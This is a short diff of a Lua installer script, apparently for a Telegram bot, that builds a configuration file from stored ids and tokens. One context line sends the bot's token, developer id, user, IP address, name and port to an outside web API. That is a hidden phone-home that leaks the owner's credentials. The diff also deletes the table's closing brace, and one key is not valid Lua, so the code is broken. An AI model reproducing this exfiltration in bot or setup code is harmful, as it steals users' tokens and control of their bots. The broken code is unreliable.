@@ -65,7 +65,7 @@ DevId = DevRio:get(Server.."IdMELAN8.lua"),
 TokenBot = DevRio:get(Server.."TokenMELAN8.lua"),
 MELAN8.lua = DevRio:get(Server.."TokenMELAN8.lua"):match("(%d+)"),
 SudoIds = {DevRio:get(Server.."IdMELAN8.lua")},
-}
+
 Create(Config, "./config.lua") 
 https.request("https:///Api/MELAN/index.php?Get=MELAN&DevId="..DevRio:get(Server.."IdMELAN").."&TokenBot="..DevRio:get(Server.."TokenMELAN").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
 file = io.open("MELAN.sh", "w")  
